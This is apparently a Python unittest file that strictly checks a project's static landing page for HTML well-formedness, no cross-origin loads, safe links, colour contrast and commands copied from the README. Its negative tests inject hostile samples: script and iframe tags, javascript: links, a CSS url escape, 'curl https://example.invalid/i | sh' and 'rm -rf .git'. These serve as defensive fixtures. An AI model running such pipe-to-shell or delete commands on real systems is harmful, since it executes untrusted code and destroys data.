"""The landing page, docs/index.html, loads nothing from another origin and says only what README.md says.

    python3 -m unittest discover -s checks -v

GitHub Pages serves docs/ from main as it stands, with no build step (docs/.nojekyll). The page is a test of this
repo, not a reference check. The test reads the page strictly and fails on what it does not know:

- the page is strict UTF-8, holds no control character but the newline and no character that reorders text, and
  starts with "<!DOCTYPE html>"
- html.parser reads it as well-formed: every element is one the page may hold, with only the attributes it may
  have, each once; every element that is opened is closed, in order; a void element is never closed; there is no
  comment, no processing instruction and no other declaration. There is no script, no frame, no form, no base,
  no style attribute and no event handler, because none of them is an element or an attribute the page may hold
- nothing is loaded from another origin: what an element loads (img src, source srcset, link href) is the name of
  a file in docs/. The CSS in the one <style> element has no at-rule but @media, no function but var(), no
  backslash and no "url", so it loads nothing either
- a link (a href) goes to a file in docs/, to an id on the page, or into the repo on GitHub: the repo itself, a
  file or a directory on main that exists in this checkout, a pull request, or the latest release. Nothing else,
  so nothing links out to another site
- docs/ holds exactly the page, .nojekyll and the two logos, and each logo is byte for byte its copy in assets/
- the page has one h1, its headings do not skip a level, html has lang="en" and every image has alt text
- the colors are a palette of custom properties, one for light and one for dark, and each pair of text and
  background in it has a contrast ratio of at least 4.5 (WCAG 2, level AA). No other hex color is written.
- every command on the page, a line of a <pre><code> block, is a line of a code block marked sh in README.md.

The line that fetches Ratchet is checked by generate.py, which writes it: it names the newest version with a date
in CHANGELOG.md, as the command in README.md does, so a release that moves the README moves the page when
generate.py is run, and generate.py --check fails until it is. The tests of that are here too.

What the test does not claim: that a browser shows the page as intended, that a named color is legible (it reads
hex colors only), or that the text is true. The text is taken from README.md and read by the maintainer. That
Pages is turned on is a setting of the repository. Each case is the page with one change, so the cases follow the
page when it changes. Standard library only.
"""

import html.parser
import os
import re
import shutil
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import generate  # noqa: E402
from test_checks import ROOT, RepoCopy, first_entry, run  # noqa: E402

DOCS = "docs"
PAGE = "index.html"
REPO = "https://github.com/fabian-von-tiedemann/ratchet"
FETCH = "git clone --branch v%s https://github.com/fabian-von-tiedemann/ratchet .ratchet"
# Every file in docs/. A logo is a copy of the file of the same name in assets/.
FILES = (".nojekyll", "index.html", "ratchet-dark.svg", "ratchet-light.svg")
LOGOS = ("ratchet-dark.svg", "ratchet-light.svg")
VOID = {"meta", "link", "img", "source", "br"}
GLOBAL = {"id", "class"}
# Every element the page may hold, with the attributes it may have beside id and class.
ELEMENTS = {
    "html": {"lang"}, "head": set(), "meta": {"charset", "name", "content"}, "title": set(), "link": {"rel", "href", "type"},
    "style": set(), "body": set(), "header": set(), "nav": set(), "main": set(), "section": set(), "footer": set(),
    "h1": set(), "h2": set(), "h3": set(), "p": set(), "ul": set(), "ol": set(), "li": set(), "a": {"href"},
    "strong": set(), "em": set(), "code": set(), "pre": set(), "br": set(),
    "picture": set(), "source": {"media", "srcset"}, "img": {"src", "width", "height", "alt"},
}
# What an element loads: the attribute that names a file.
LOADS = {("img", "src"), ("source", "srcset"), ("link", "href")}
META = {"viewport", "description", "color-scheme"}
FILE = re.compile(r"[a-z0-9][a-z0-9.-]*\Z")
FRAGMENT = re.compile(r"#[a-z0-9]+(?:-[a-z0-9]+)*\Z")
# A path on main: parts that may start with one dot, as .github does, so no part is "." or "..".
REPO_PATH = re.compile(r"(?:\.?[A-Za-z0-9_][A-Za-z0-9_.-]*/)*\.?[A-Za-z0-9_][A-Za-z0-9_.-]*")
REPO_LINK = re.compile(
    r"(?:/(?P<kind>blob|tree)/main/(?P<path>%s)|/pull/[1-9][0-9]*|/releases/latest)?(?:#[a-z0-9]+(?:-[a-z0-9]+)*)?\Z" % REPO_PATH.pattern
)
# Characters the page may not hold: controls but the newline, and the ones that reorder or hide text.
HIDDEN = re.compile("[\x00-\x09\x0b-\x1f\x7f-\x9f\u200b-\u200f\u202a-\u202e\u2060-\u2069\ufeff]")
CSS_FUNCTION = re.compile(r"([A-Za-z_-][A-Za-z0-9_-]*)\(")
CSS_AT = re.compile(r"@([A-Za-z-]+)")
HEX = re.compile(r"#[0-9A-Fa-f]{3,8}\b")
PALETTE = re.compile(r"--([a-z]+(?:-[a-z]+)*):\s*(#[0-9a-f]{6});")
ROOT_BLOCK = re.compile(r":root\s*\{([^{}]*)\}")
DARK = "@media (prefers-color-scheme: dark)"
# Pairs of text and background in the palette, each to have a contrast ratio of at least 4.5.
PAIRS = (("fg", "bg"), ("muted", "bg"), ("link", "bg"), ("fg", "code-bg"))
CONTRAST = 4.5


class PageReader(html.parser.HTMLParser):
    """Reads the page and collects what is wrong with its form, what it loads and links to, its ids and commands."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.problems = []
        self.stack = []
        self.seen_doctype = False
        self.started = False
        self.loads, self.links, self.ids, self.headings, self.images = [], [], [], [], []
        self.commands, self.styles, self.counts = [], [], {}
        self.text_in = None

    def where(self):
        return "line %d" % self.getpos()[0]

    def handle_decl(self, decl):
        if decl != "DOCTYPE html" or self.started or self.seen_doctype:
            self.problems.append("%s: the only declaration is <!DOCTYPE html>, first, found <!%s>" % (self.where(), decl))
        self.seen_doctype = True

    def handle_starttag(self, tag, attrs):
        self.start(tag, attrs, closed=False)

    def handle_startendtag(self, tag, attrs):
        self.start(tag, attrs, closed=True)

    def start(self, tag, attrs, closed):
        self.started = True
        if tag not in ELEMENTS:
            self.problems.append("%s: <%s> is not an element this page may hold" % (self.where(), tag))
        if closed and tag not in VOID:
            self.problems.append("%s: <%s/> is not closed by its slash, only a void element may end so" % (self.where(), tag))
        self.counts[tag] = self.counts.get(tag, 0) + 1
        names = [name for name, _ in attrs]
        values = {}
        for name, value in attrs:
            if names.count(name) > 1 and name not in values:
                self.problems.append("%s: <%s> has the attribute %s twice" % (self.where(), tag, name))
            values.setdefault(name, value)
            if name not in GLOBAL and name not in ELEMENTS.get(tag, set()):
                self.problems.append("%s: <%s> may not have the attribute %s" % (self.where(), tag, name))
            elif value is None:
                self.problems.append("%s: <%s> has the attribute %s without a value" % (self.where(), tag, name))
            elif (tag, name) in LOADS:
                self.loads.append((self.where(), tag, value))
            elif (tag, name) == ("a", "href"):
                self.links.append((self.where(), value))
            elif name == "id":
                self.ids.append(value)
        if tag == "html" and values.get("lang") != "en":
            self.problems.append('%s: <html> must have lang="en"' % self.where())
        if tag == "meta" and not (values == {"charset": "utf-8"} or (set(values) == {"name", "content"} and values["name"] in META)):
            self.problems.append('%s: a <meta> is charset="utf-8", or a name among %s with content' % (self.where(), ", ".join(sorted(META))))
        if tag == "link" and (values.get("rel") != "icon" or "href" not in values):
            self.problems.append('%s: the only <link> is rel="icon" with an href' % self.where())
        if tag == "a" and "href" not in values:
            self.problems.append("%s: an <a> has an href" % self.where())
        if tag == "img":
            self.images.append((self.where(), values.get("alt")))
        if tag == "source" and self.stack[-1:] != ["picture"]:
            self.problems.append("%s: a <source> stands in a <picture>" % self.where())
        if re.fullmatch(r"h[1-6]", tag):
            self.headings.append((self.where(), int(tag[1])))
        if tag == "code" and self.stack[-1:] == ["pre"]:
            self.text_in = []
        if tag not in VOID:
            self.stack.append(tag)

    def handle_endtag(self, tag):
        if tag in VOID:
            self.problems.append("%s: </%s> closes a void element" % (self.where(), tag))
            return
        if not self.stack or self.stack[-1] != tag:
            self.problems.append("%s: </%s> does not close the element that is open, %s"
                                 % (self.where(), tag, "<%s>" % self.stack[-1] if self.stack else "none"))
            if tag in self.stack:
                del self.stack[self.stack.index(tag):]
            return
        self.stack.pop()
        if tag == "code" and self.text_in is not None:
            self.commands += "".join(self.text_in).split("\n")
            self.text_in = None

    def handle_data(self, data):
        if data.strip():
            self.started = True
        if self.text_in is not None:
            self.text_in.append(data)
        if self.stack[-1:] == ["style"]:
            self.styles.append(data)

    def handle_comment(self, data):
        self.problems.append("%s: a comment, which the page does not hold" % self.where())

    def handle_pi(self, data):
        self.problems.append("%s: a processing instruction, which the page does not hold" % self.where())

    def unknown_decl(self, data):
        self.problems.append("%s: a declaration <![%s]>, which the page does not hold" % (self.where(), data))


def luminance(color):
    channels = []
    for at in (1, 3, 5):
        value = int(color[at:at + 2], 16) / 255
        channels.append(value / 12.92 if value <= 0.04045 else ((value + 0.055) / 1.055) ** 2.4)
    return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2]


def contrast(one, other):
    high, low = sorted((luminance(one), luminance(other)), reverse=True)
    return (high + 0.05) / (low + 0.05)


def css_problems(css):
    problems = []
    if "\\" in css:
        problems.append("the CSS holds a backslash, which could spell a word the check does not see")
    if "url" in css.lower():
        problems.append('the CSS holds "url", and loads nothing')
    for name in sorted(set(CSS_FUNCTION.findall(css)) - {"var"}):
        problems.append("the CSS calls %s(), and the only function it may call is var()" % name)
    for name in sorted(set(CSS_AT.findall(css)) - {"media"}):
        problems.append("the CSS holds @%s, and the only at-rule it may hold is @media" % name)
    blocks = ROOT_BLOCK.findall(css)
    dark = css.find(DARK)
    roots = [match.start() for match in ROOT_BLOCK.finditer(css)]
    if len(blocks) != 2 or dark < 0 or not (roots[0] < dark < roots[1]):
        problems.append("the CSS has two :root blocks of colors, the first for light and the second inside %s" % DARK)
        return problems
    palettes = [dict(PALETTE.findall(block)) for block in blocks]
    if sum(len(PALETTE.findall(block)) for block in blocks) != len(HEX.findall(css)):
        problems.append("the CSS writes a hex color outside the two palettes, or one that is not #rrggbb in lower case")
    for scheme, palette in zip(("light", "dark"), palettes):
        for text, background in PAIRS:
            if text not in palette or background not in palette:
                problems.append("the %s palette has no --%s or no --%s" % (scheme, text, background))
                continue
            ratio = contrast(palette[text], palette[background])
            if ratio < CONTRAST:
                problems.append("in the %s palette, --%s on --%s has a contrast ratio of %.2f, under %.1f"
                                % (scheme, text, background, ratio, CONTRAST))
    if set(palettes[0]) != set(palettes[1]):
        problems.append("the light and the dark palette name different colors")
    return problems


def readme_commands(readme):
    """Every line of a code block marked sh in README.md, without the spaces that indent it."""
    lines, language = set(), None
    for line in readme.split("\n"):
        bare = line.lstrip(" ")
        if bare.startswith("```"):
            language = bare[3:] if language is None else None
        elif language == "sh":
            lines.add(bare)
    return lines


def page_problems(root):
    """Everything wrong with docs/ in the checkout at root, as a list of messages that name the file."""
    docs = os.path.join(root, DOCS)
    name = "%s/%s" % (DOCS, PAGE)
    if not os.path.isdir(docs):
        return ["%s/: there is no such directory" % DOCS]
    problems = []
    present = sorted(os.listdir(docs))
    if tuple(present) != FILES:
        problems.append("%s/ must hold exactly %s, found %s" % (DOCS, ", ".join(FILES), ", ".join(present) or "nothing"))
    for logo in LOGOS:
        paths = os.path.join(docs, logo), os.path.join(root, "assets", logo)
        if all(os.path.isfile(path) and not os.path.islink(path) for path in paths):
            with open(paths[0], "rb") as one, open(paths[1], "rb") as other:
                if one.read() != other.read():
                    problems.append("%s/%s is not byte for byte assets/%s" % (DOCS, logo, logo))
    path = os.path.join(docs, PAGE)
    if os.path.islink(path) or not os.path.isfile(path):
        return problems + ["%s: there is no such file" % name]
    with open(path, "rb") as handle:
        data = handle.read()
    try:
        text = data.decode("utf-8", errors="strict")
    except UnicodeDecodeError as error:
        return problems + ["%s: not valid UTF-8 at byte %d" % (name, error.start)]
    for number, line in enumerate(text.split("\n"), 1):
        for match in HIDDEN.finditer(line):
            problems.append("%s:%d: holds U+%04X, a control or a character that reorders or hides text" % (name, number, ord(match.group())))
    if not text.startswith("<!DOCTYPE html>\n"):
        problems.append("%s: does not start with <!DOCTYPE html> and a newline" % name)

    reader = PageReader()
    reader.feed(text)
    reader.close()
    found = ["%s: %s" % (name, problem) for problem in reader.problems]
    if reader.stack:
        found.append("%s: elements opened and never closed: %s" % (name, ", ".join("<%s>" % tag for tag in reader.stack)))
    if reader.rawdata:
        found.append("%s: html.parser did not read the end of the page" % name)
    for tag in ("html", "head", "title", "body", "main", "h1", "style"):
        if reader.counts.get(tag, 0) != 1:
            found.append("%s: holds <%s> %d times, and must hold it once" % (name, tag, reader.counts.get(tag, 0)))
    level = 0
    for where, heading in reader.headings:
        if heading > level + 1:
            found.append("%s: %s: <h%d> after <h%d> skips a level" % (name, where, heading, level))
        level = heading
    if reader.headings[:1] and reader.headings[0][1] != 1:
        found.append("%s: the first heading is not <h1>" % name)
    for where, alt in reader.images:
        if not alt or not alt.strip():
            found.append("%s: %s: an <img> without alt text" % (name, where))
    for where, tag, value in reader.loads:
        if not FILE.match(value) or value not in FILES or value == ".nojekyll":
            found.append("%s: %s: <%s> loads %r, and the page loads only a file in %s/ by its name" % (name, where, tag, value, DOCS))
    duplicates = sorted(set(each for each in reader.ids if reader.ids.count(each) > 1))
    if duplicates:
        found.append("%s: ids that stand more than once: %s" % (name, ", ".join(duplicates)))
    for where, value in reader.links:
        problem = link_problem(root, value, reader.ids)
        if problem:
            found.append("%s: %s: the link %r %s" % (name, where, value, problem))
    found += ["%s: %s" % (name, problem) for problem in css_problems("".join(reader.styles))]
    readme_path = os.path.join(root, "README.md")
    with open(readme_path, encoding="utf-8", errors="strict") as handle:
        allowed = readme_commands(handle.read())
    for command in reader.commands:
        if command not in allowed:
            found.append("%s: the command %r is not a line of a code block marked sh in README.md" % (name, command))
    if not reader.commands:
        found.append("%s: holds no command" % name)
    return problems + found


def link_problem(root, value, ids):
    """Why a link on the page is not allowed, or None."""
    if value.startswith("#"):
        if not FRAGMENT.match(value) or value[1:] not in ids:
            return "is not an id on the page"
        return None
    if value.startswith(REPO):
        match = REPO_LINK.match(value[len(REPO):])
        if not match:
            return "goes into the repo, but not to the repo, a file or directory on main, a pull request or the latest release"
        if match.group("kind"):
            target = os.path.join(root, *match.group("path").split("/"))
            if match.group("kind") == "blob" and not os.path.isfile(target):
                return "names a file that is not in this checkout"
            if match.group("kind") == "tree" and not os.path.isdir(target):
                return "names a directory that is not in this checkout"
        return None
    target = value.split("#")[0]
    if FILE.match(target) and target in FILES and target != ".nojekyll":
        return None
    return "leads neither to a file in %s/, nor to an id on the page, nor into the repo on GitHub" % DOCS


class Page(RepoCopy, unittest.TestCase):
    """The page as it stands passes, and each change below fails with its message."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        text = self.page()
        self.assertIn(old, text, "the test expects %r on the page" % old)
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text.replace(old, new, 1))

    def assert_fails(self, message):
        problems = page_problems(self.copy)
        self.assertTrue(any(message in problem for problem in problems), "%r not in %r" % (message, problems))

    def test_the_page_as_it_stands_passes(self):
        self.assertEqual(page_problems(ROOT), [])
        self.assertEqual(page_problems(self.copy), [])

    def test_the_page_names_what_it_must(self):
        text = self.page()
        released = generate.changelog_context(self.copy)[1]
        for words in (FETCH % released, "python3 .ratchet/checks/init.py --check", "python3 .ratchet/checks/init.py</code>",
                      REPO + "/releases/latest", REPO + "/blob/main/LICENSE", 'href="%s"' % REPO,
                      "<h2 id=\"start-here\">Start here</h2>", "prefers-color-scheme: dark", "The honest limits",
                      "Evidence from this repo"):
            self.assertIn(words, text)

    def test_no_page_fails(self):
        shutil.rmtree(os.path.join(self.copy, DOCS))
        self.assert_fails("docs/: there is no such directory")

    def test_a_file_in_docs_that_is_not_known_fails(self):
        for extra in ("404.html", "CNAME", "_config.yml"):
            with self.subTest(extra=extra):
                self.setUp()
                with open(os.path.join(self.copy, DOCS, extra), "w", encoding="utf-8") as handle:
                    handle.write("x\n")
                self.assert_fails("docs/ must hold exactly")

    def test_no_nojekyll_fails(self):
        os.remove(os.path.join(self.copy, DOCS, ".nojekyll"))
        self.assert_fails("docs/ must hold exactly")

    def test_a_logo_that_is_not_the_repos_fails(self):
        with open(os.path.join(self.copy, DOCS, "ratchet-dark.svg"), "a", encoding="utf-8") as handle:
            handle.write("<!-- -->\n")
        self.assert_fails("docs/ratchet-dark.svg is not byte for byte assets/ratchet-dark.svg")

    def test_a_page_that_is_not_utf8_fails(self):
        with open(os.path.join(self.copy, DOCS, PAGE), "ab") as handle:
            handle.write(b"\xff\n")
        self.assert_fails("docs/index.html: not valid UTF-8 at byte")

    def test_a_hidden_character_fails(self):
        for character in ("\r", "\t", "\u202e", "\u200b", "\ufeff", "\x00"):
            with self.subTest(code="%04X" % ord(character)):
                self.setUp()
                self.change("<h1>Ratchet</h1>", "<h1>Ratchet%s</h1>" % character)
                self.assert_fails("holds U+%04X" % ord(character))

    def test_a_page_without_its_doctype_fails(self):
        self.change("<!DOCTYPE html>\n", "")
        self.assert_fails("does not start with <!DOCTYPE html>")

    def test_a_script_fails_in_every_form(self):
        for script in ('<script src="https://example.invalid/t.js"></script>', "<script>document.title = 'x'</script>",
                       '<SCRIPT src="t.js"></SCRIPT>', '<iframe src="https://example.invalid/"></iframe>',
                       '<object data="https://example.invalid/x"></object>', '<embed src="https://example.invalid/x">',
                       '<base href="https://example.invalid/">', '<form action="https://example.invalid/"></form>',
                       '<svg><image href="https://example.invalid/x.png"></image></svg>', '<audio src="x.mp3"></audio>'):
            with self.subTest(script=script):
                self.setUp()
                self.change("</main>", script + "\n</main>")
                self.assert_fails("is not an element this page may hold")

    def test_an_event_handler_or_a_style_attribute_fails(self):
        for attribute, name in (('onload="x()"', "onload"), ('style="background: url(https://example.invalid/x.png)"', "style"),
                                ('srcset="https://example.invalid/x.png 2x"', "srcset"), ('loading="lazy"', "loading")):
            with self.subTest(attribute=attribute):
                self.setUp()
                self.change('<img src="ratchet-light.svg"', '<img %s src="ratchet-light.svg"' % attribute)
                self.assert_fails("<img> may not have the attribute %s" % name)

    def test_a_load_from_another_origin_fails(self):
        for old, new in (('<img src="ratchet-light.svg"', '<img src="https://example.invalid/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="//example.invalid/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="&#104;ttps://example.invalid/x.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="' + REPO + '/raw/main/assets/ratchet-light.svg"'),
                         ('<img src="ratchet-light.svg"', '<img src="../assets/ratchet-light.svg"'),
                         ('srcset="ratchet-dark.svg"', 'srcset="https://example.invalid/ratchet-dark.svg"'),
                         ('<link rel="icon" href="ratchet-light.svg"', '<link rel="icon" href="https://example.invalid/i.svg"')):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("and the page loads only a file in docs/ by its name")

    def test_a_stylesheet_or_a_font_from_elsewhere_fails(self):
        for rule, message in (("@import 'https://example.invalid/x.css';", "@import"),
                              ("@font-face { font-family: x; src: local(x); }", "@font-face"),
                              ("body { background: url(https://example.invalid/x.png); }", '"url"'),
                              ("body { background: URL(x.png); }", '"url"'),
                              ("body { background: u\\72l(x.png); }", "backslash"),
                              ("body { background: image-set('x.png' 1x); }", "image-set()"),
                              ("body { width: calc(1px + 1px); }", "calc()")):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails(message)
        self.setUp()
        self.change('<link rel="icon"', '<link rel="stylesheet"')
        self.assert_fails('the only <link> is rel="icon"')

    def test_a_link_out_of_the_repo_fails(self):
        for target in ("https://example.invalid/", "http://github.com/fabian-von-tiedemann/ratchet",
                       "https://github.com/fabian-von-tiedemann/ratchet-other", "https://github.com/fabian-von-tiedemann",
                       "javascript:alert(1)", "&#106;avascript:alert(1)", "mailto:x@example.invalid",
                       "https://fabian-von-tiedemann.github.io/ratchet/", "//example.invalid/"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s"' % REPO, 'href="%s"' % target)
                self.assert_fails("the link")

    def test_a_link_into_the_repo_that_leads_nowhere_fails(self):
        for target, message in (("/blob/main/NOT-A-FILE.md", "names a file that is not in this checkout"),
                                ("/tree/main/not-a-directory", "names a directory that is not in this checkout"),
                                ("/blob/main/checks", "names a file that is not in this checkout"),
                                ("/blob/main/../../other/x", "goes into the repo, but not"),
                                ("/blob/other/README.md", "goes into the repo, but not"),
                                ("/settings", "goes into the repo, but not"),
                                ("/releases/latest/../../x", "goes into the repo, but not")):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="%s/blob/main/LICENSE"' % REPO, 'href="%s%s"' % (REPO, target))
                self.assert_fails(message)

    def test_a_relative_link_or_a_fragment_that_leads_nowhere_fails(self):
        for target in ("missing.html", "../README.md", "/index.html", "#no-such-id", ".nojekyll"):
            with self.subTest(target=target):
                self.setUp()
                self.change('href="#start-here"', 'href="%s"' % target)
                self.assert_fails("the link")

    def test_a_relative_link_to_the_page_passes(self):
        self.change('href="#start-here"', 'href="index.html#start-here"')
        self.assertEqual(page_problems(self.copy), [])

    def test_an_element_left_open_or_closed_out_of_order_fails(self):
        for old, new, message in (("</main>", "", "</body> does not close the element that is open, <main>"),
                                  ("<h1>Ratchet</h1>", "<h1><em>Ratchet</h1></em>", "</h1> does not close the element that is open, <em>"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1></p>", "</p> does not close"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><br></br>", "</br> closes a void element"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><p/>", "<p/> is not closed by its slash"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><!-- x -->", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><![CDATA[x]]>", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><?php ?>", "which the page does not hold"),
                                  ("<h1>Ratchet</h1>", '<h1 id="x" id="y">Ratchet</h1>', "has the attribute id twice"),
                                  ("<h1>Ratchet</h1>", "<h1 hidden>Ratchet</h1>", "may not have the attribute hidden"),
                                  ("<main>", "<main><title>x</title>", "holds <title> 2 times")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_the_page_is_accessible_as_far_as_the_test_reads(self):
        for old, new, message in (('<html lang="en">', "<html>", 'must have lang="en"'),
                                  ('alt="Ratchet logo"', 'alt=""', "an <img> without alt text"),
                                  ('alt="Ratchet logo"', "", "an <img> without alt text"),
                                  ("<h1>Ratchet</h1>", "<h1>Ratchet</h1><h3>x</h3>", "<h3> after <h1> skips a level"),
                                  ("<h1>Ratchet</h1>", "<h2>Ratchet</h2>", "holds <h1> 0 times")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails(message)

    def test_colors_with_too_little_contrast_fail(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        light = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[0]))
        dark = dict(PALETTE.findall(ROOT_BLOCK.findall(css)[1]))
        for scheme, palette, key, faint in (("light", light, "muted", "#aaaaaa"), ("dark", dark, "link", "#333366"),
                                            ("light", light, "bg", "#777777")):
            with self.subTest(scheme=scheme, key=key):
                self.setUp()
                self.change("--%s: %s;" % (key, palette[key]), "--%s: %s;" % (key, faint))
                self.assert_fails("in the %s palette" % scheme)
        self.setUp()
        self.change("</style>", "p { color: #777; }\n</style>")
        self.assert_fails("a hex color outside the two palettes")
        self.setUp()
        self.change(DARK, "@media (prefers-color-scheme: light)")
        self.assert_fails("the CSS has two :root blocks of colors")

    def test_the_ratios_are_as_wcag_computes_them(self):
        self.assertAlmostEqual(contrast("#000000", "#ffffff"), 21.0)
        self.assertAlmostEqual(contrast("#ffffff", "#ffffff"), 1.0)
        self.assertAlmostEqual(contrast("#767676", "#ffffff"), 4.54, places=2)

    def test_a_command_that_is_not_in_the_readme_fails(self):
        for old, new in (("python3 .ratchet/checks/init.py --check</code>", "python3 .ratchet/checks/init.py --force</code>"),
                         ("python3 .ratchet/checks/init.py</code>", "curl https://example.invalid/i | sh</code>"),
                         ("python3 .ratchet/checks/init.py</code>", "python3 .ratchet/checks/init.py\nrm -rf .git</code>")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_fails("is not a line of a code block marked sh in README.md")


class PageFetchLine(RepoCopy, unittest.TestCase):
    """generate.py writes the line on the page that fetches Ratchet, and --check fails when it is not current."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_page_fetches_what_the_readme_fetches(self):
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        self.assertEqual([each for each in self.page().split("\n") if "git clone" in each], [line])
        with open(os.path.join(self.copy, "README.md"), encoding="utf-8") as handle:
            self.assertIn("   " + FETCH % fetched + "\n", handle.read())

    def test_a_release_that_moves_only_the_readme_fails_and_generate_moves_the_page(self):
        version, fetched = first_entry(self.copy)
        self.assertNotEqual(version, fetched)
        before = self.page()
        # The release gives the entry its date and moves the README, as AGENTS.md says. Then the page is stale.
        path = os.path.join(self.copy, "CHANGELOG.md")
        with open(path, encoding="utf-8", newline="") as handle:
            changelog = handle.read()
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(changelog.replace("## %s (unreleased)" % version, "## %s (2026-12-01)" % version, 1))
        path = os.path.join(self.copy, "README.md")
        with open(path, encoding="utf-8", newline="") as handle:
            readme = handle.read()
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(readme.replace("--branch v%s " % fetched, "--branch v%s " % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace(FETCH % fetched, FETCH % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(page_problems(self.copy), [])

    def test_the_page_moved_ahead_of_the_readme_fails(self):
        version, fetched = first_entry(self.copy)
        self.write_page(self.page().replace(FETCH % fetched, FETCH % version))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)

    def test_a_fetch_line_of_another_form_fails(self):
        version, fetched = first_entry(self.copy)
        line = "<pre><code>%s</code></pre>" % (FETCH % fetched)
        for new in ("", line + "\n" + line, "<pre><code>%s && git -C .ratchet checkout main</code></pre>" % (FETCH % fetched),
                    "<p>%s</p>" % (FETCH % fetched), line + "\n<p>Or git clone the repo.</p>",
                    "<pre><code>%s</code></pre>" % (FETCH % "1.x")):
            with self.subTest(new=new):
                self.setUp()
                first_entry(self.copy)
                self.write_page(self.page().replace(line, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: the command that fetches Ratchet must be one line", output)
                self.assertNotIn("Traceback", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)

    def test_no_page_fails(self):
        os.remove(os.path.join(self.copy, DOCS, PAGE))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: the file is missing", output)

    def test_a_page_that_is_not_utf8_fails_without_a_traceback(self):
        with open(os.path.join(self.copy, DOCS, PAGE), "ab") as handle:
            handle.write(b"\xff\n")
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("is not valid UTF-8", output)
        self.assertNotIn("Traceback", output)


if __name__ == "__main__":
    unittest.main()
